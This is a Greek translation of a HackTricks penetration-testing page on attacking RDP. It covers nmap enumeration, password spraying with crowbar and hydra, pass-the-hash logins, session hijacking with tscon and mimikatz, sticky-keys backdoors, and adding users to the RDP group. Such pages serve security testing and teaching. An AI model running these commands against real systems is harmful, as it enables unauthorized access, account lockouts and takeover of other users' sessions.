# 3389 - Ελέγχος Ευπαθειών RDP

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Άμεση διαθεσιμότητα εγκατάστασης για αξιολόγηση ευπαθειών & ελέγχο διείσδυσης**. Εκτελέστε έναν πλήρη έλεγχο διείσδυσης από οπουδήποτε με 20+ εργαλεία & χαρακτηριστικά που καλύπτουν από την αναγνώριση μέχρι την αναφορά. Δεν αντικαθιστούμε τους ειδικούς σε ελέγχους διείσδυσης - αναπτύσσουμε προσαρμοσμένα εργαλεία, ανίχνευση & εκμετάλλευση modules για να τους δώσουμε χρόνο να εξερευνήσουν βαθύτερα, να ανοίξουν κελιά και να διασκεδάσουν.

{% embed url="https://pentest-tools.com/" %}

## Βασικές Πληροφορίες

Αναπτύχθηκε από τη Microsoft, το **Remote Desktop Protocol** (**RDP**) σχεδιάστηκε για να επιτρέπει μια σύνδεση γραφικής διεπαφής μεταξύ υπολογιστών μέσω δικτύου. Για την εγκαθίδρυση μιας τέτοιας σύνδεσης, ο χρήστης χρησιμοποιεί λογισμικό πελάτη **RDP**, ενώ ταυτόχρονα, ο απομακρυσμένος υπολογιστής πρέπει να λειτουργεί με λογισμικό διακομιστή **RDP**. Αυτή η διάταξη επιτρέπει τον άνετο έλεγχο και πρόσβαση στο περιβάλλον εργασίας ενός απομακρυσμένου υπολογιστή, φέρνοντας ουσιαστικά τη διεπαφή του στη συσκευή του χρήστη. 

**Προεπιλεγμένη θύρα:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## Απαρίθμηση

### Αυτόματη

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
{% endcode %}

Ελέγχει τη διαθεσιμότητα κρυπτογράφησης και ευπάθειας DoS (χωρίς να προκαλέσει DoS στην υπηρεσία) και αποκτά πληροφορίες NTLM Windows (εκδόσεις).

### [Χυδαία βία](../generic-methodologies-and-resources/brute-force.md#rdp)

**Να είστε προσεκτικοί, μπορείτε να κλειδώσετε λογαριασμούς**

### **Ψεκασμός κωδικών**

**Να είστε προσεκτικοί, μπορείτε να κλειδώσετε λογαριασμούς**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### Σύνδεση με γνωστά διαπιστευτήρια/κατακευή
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### Έλεγχος γνωστών διαπιστευτηρίων εναντίον υπηρεσιών RDP

Το rdp\_check.py από το impacket σας επιτρέπει να ελέγξετε εάν κάποια διαπιστευτήρια είναι έγκυρα για μια υπηρεσία RDP:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Άμεση διαθεσιμότητα εγκατάστασης για αξιολόγηση ευπαθειών & δοκιμές διείσδυσης**. Εκτελέστε μια πλήρη δοκιμή διείσδυσης από οπουδήποτε με 20+ εργαλεία & χαρακτηριστικά που καλύπτουν από την αναγνώριση μέχρι την αναφορά. Δεν αντικαθιστούμε τους δοκιμαστές διείσδυσης - αναπτύσσουμε προσαρμοσμένα εργαλεία, ανίχνευση & εκμετάλλευση modules για να τους δώσουμε πίσω χρόνο να εξερευνήσουν βαθύτερα, να ανοίξουν κελιά και να διασκεδάσουν.

{% embed url="https://pentest-tools.com/" %}

## **Επιθέσεις**

### Κλοπή συνεδρίας

Με **δικαιώματα SYSTEM** μπορείτε να έχετε πρόσβαση σε οποιαδήποτε **ανοιχτή συνεδρία RDP από οποιονδήποτε χρήστη** χωρίς την ανάγκη να γνωρίζετε τον κωδικό του ιδιοκτήτη.

**Λήψη ανοιχτών συνεδριών:**
```
query user
```
**Πρόσβαση στην επιλεγμένη συνεδρία**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
Τώρα θα βρίσκεστε μέσα στην επιλεγμένη συνεδρία RDP και θα πρέπει να υποδυθείτε έναν χρήστη χρησιμοποιώντας μόνο τα εργαλεία και τα χαρακτηριστικά των Windows.

**Σημαντικό**: Όταν έχετε πρόσβαση σε μια ενεργή συνεδρία RDP, θα αποσυνδέσετε τον χρήστη που τη χρησιμοποιούσε.

Μπορείτε να λάβετε κωδικούς πρόσβασης από τη διαδικασία ανάκτησής τους, αλλά αυτή η μέθοδος είναι πολύ πιο γρήγορη και σας επιτρέπει να αλληλεπιδράτε με τα εικονικά γραφεία του χρήστη (κωδικοί πρόσβασης σε notepad χωρίς να αποθηκεύονται στο δίσκο, άλλες συνεδρίες RDP που είναι ανοιχτές σε άλλα μηχανήματα...)

#### **Mimikatz**

Μπορείτε επίσης να χρησιμοποιήσετε το mimikatz για να το κάνετε αυτό:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

Συνδυάζοντας αυτήν την τεχνική με τα **stickykeys** ή **utilman θα μπορείτε να έχετε πρόσβαση σε ένα διαχειριστικό CMD και οποιαδήποτε συνεδρία RDP οποτεδήποτε**

Μπορείτε να αναζητήσετε RDPs που έχουν ήδη μολυνθεί με μία από αυτές τις τεχνικές με: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### RDP Εισαγωγή Διεργασίας

Αν κάποιος από διαφορετικό τομέα ή με **καλύτερα προνόμια συνδεθεί μέσω RDP** στον Η/Υ όπου **είστε Διαχειριστής**, μπορείτε **να εισάγετε** το beacon σας στην **διαδικασία της συνεδρίας RDP** του και να ενεργήσετε ως αυτός:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### Προσθήκη Χρήστη στην Ομάδα RDP
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## Αυτόματα Εργαλεία

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn** είναι ένα πλαίσιο μετά-εκμετάλλευσης που δημιουργήθηκε σε Powershell, σχεδιασμένο κυρίως για να αυτοματοποιήσει την επίθεση **Shadow** σε υπολογιστές Microsoft Windows. Αυτή η ευπάθεια (καταχωρημένη ως χαρακτηριστικό από τη Microsoft) επιτρέπει σε έναν απομακρυσμένο εισβολέα να **παρακολουθήσει την επιφάνεια εργασίας του θύματός του χωρίς τη συγκατάθεσή του**, και ακόμη να την ελέγξει κατόπιν αιτήματος, χρησιμοποιώντας εργαλεία που είναι ενσωματωμένα στο ίδιο το λειτουργικό σύστημα.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
* Έλεγχος ποντικιού και πληκτρολογίου με αυτοματοποιημένο τρόπο από τη γραμμή εντολών
* Έλεγχος πρόχειρου με αυτοματοποιημένο τρόπο από τη γραμμή εντολών
* Δημιουργία SOCKS proxy από τον πελάτη που κατευθύνει την επικοινωνία δικτύου προς τον στόχο μέσω RDP
* Εκτέλεση αυθαίρετων εντολών SHELL και PowerShell στον στόχο χωρίς ανέβασμα αρχείων
* Ανέβασμα και λήψη αρχείων από/προς τον στόχο ακόμη και όταν οι μεταφορές αρχείων είναι απενεργοποιημένες στον στόχο

## Αυτόματες Εντολές HackTricks
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Άμεση διαθεσιμότητα εγκατάστασης για αξιολόγηση ευπαθειών & δοκιμές διείσδυσης**. Εκτελέστε μια πλήρη δοκιμή διείσδυσης από οπουδήποτε με 20+ εργαλεία & χαρακτηριστικά που καλύπτουν από την αναγνώριση μέχρι την αναφορά. Δεν αντικαθιστούμε τους δοκιμαστές διείσδυσης - αναπτύσσουμε προσαρμοσμένα εργαλεία, ανίχνευση & εκμετάλλευση modules για να τους δώσουμε πίσω χρόνο να εξερευνήσουν βαθύτερα, να ανοίξουν κελιά και να διασκεδάσουν.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**Την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
